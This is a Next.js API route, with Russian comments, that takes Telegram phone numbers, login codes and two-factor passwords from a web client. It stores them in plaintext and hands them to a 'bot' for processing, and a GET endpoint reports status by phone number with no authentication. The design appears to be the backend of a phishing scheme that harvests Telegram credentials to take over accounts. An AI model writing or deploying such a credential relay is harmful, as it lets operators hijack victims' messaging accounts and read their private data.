import { type NextRequest, NextResponse } from "next/server"
import {
  createAuthRequest,
  getLatestAuthRequestByPhone,
  getAuthRequestByTelegramId,
  getAuthRequestById,
  updateAuthRequest,
} from "@/lib/auth-store"

// POST /api/telegram/auth - Создать запрос на авторизацию
export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { action, phone, code, password, chatId, telegramId, requestId } = body

    if (!action) {
      return NextResponse.json({ success: false, error: "action is required" }, { status: 400 })
    }

    const userId = telegramId || chatId

    let finalPhone = phone
    let finalTelegramId = userId
    const finalRequestId = requestId

    if (requestId) {
      const existingRequest = getAuthRequestById(requestId)
      if (existingRequest) {
        finalPhone = existingRequest.phone
        finalTelegramId = existingRequest.telegramId
        console.log(`[API] Using existing request ${requestId}: phone=${finalPhone}, telegramId=${finalTelegramId}`)
      }
    }

    // If still no phone, try to find from previous requests
    if ((action === "send_code" || action === "send_password") && !finalPhone && userId) {
      const previousRequest = getAuthRequestByTelegramId(userId)
      if (previousRequest) {
        finalPhone = previousRequest.phone
        finalTelegramId = previousRequest.telegramId || userId
        console.log(`[API] Found previous request for user ${userId}: phone=${finalPhone}`)
      }
    }

    if (action === "send_password") {
      const existingRequest = requestId ? getAuthRequestById(requestId) : null

      if (existingRequest) {
        console.log(`[API] 🔐 Password action received:`)
        console.log(`  - requestId: ${requestId}`)
        console.log(`  - phone: ${existingRequest.phone}`)
        console.log(`  - telegramId: ${finalTelegramId}`)
        console.log(`  - password: ${password ? `****${password.slice(-2)}` : "empty"}`)

        updateAuthRequest(requestId, {
          action: "send_password",
          password: password,
          status: "pending",
          processed: false,
        })

        const updatedRequest = getAuthRequestById(requestId)

        console.log(`[API] ✅ Updated request for bot to process`)

        return NextResponse.json({
          success: true,
          requestId: requestId,
          status: "pending",
          message: "Пароль получен и отправлен боту",
          telegramId: finalTelegramId,
        })
      } else {
        console.error(`[API] ❌ No request found for send_password: requestId=${requestId}`)
        return NextResponse.json(
          { success: false, error: "Request not found for password submission" },
          { status: 404 },
        )
      }
    }

    const authRequest = createAuthRequest({
      action,
      phone: finalPhone,
      code,
      password,
      chatId,
      telegramId: finalTelegramId,
      requestId: finalRequestId, // Pass requestId to reuse
    })

    console.log(
      `[API] Created auth request: ${authRequest.requestId}, action: ${action}, phone: ${finalPhone}, telegramId: ${finalTelegramId}`,
    )

    return NextResponse.json({
      success: true,
      requestId: authRequest.requestId,
      status: authRequest.status,
      telegramId: finalTelegramId,
      phone: finalPhone,
    })
  } catch (error) {
    console.error("[API] Error creating auth request:", error)
    return NextResponse.json({ success: false, error: "Internal server error" }, { status: 500 })
  }
}

// GET /api/telegram/auth - Получить статус по номеру телефона
export async function GET(request: NextRequest) {
  try {
    const { searchParams } = new URL(request.url)
    const phone = searchParams.get("phone")

    if (!phone) {
      return NextResponse.json({ success: false, error: "phone is required" }, { status: 400 })
    }

    const authRequest = getLatestAuthRequestByPhone(phone)

    if (!authRequest) {
      return NextResponse.json({ success: false, error: "No request found for this phone" }, { status: 404 })
    }

    return NextResponse.json({
      success: true,
      requestId: authRequest.requestId,
      status: authRequest.status,
      message: authRequest.message,
      error: authRequest.error,
      telegramId: authRequest.telegramId,
    })
  } catch (error) {
    console.error("[API] Error getting auth request:", error)
    return NextResponse.json({ success: false, error: "Internal server error" }, { status: 500 })
  }
}
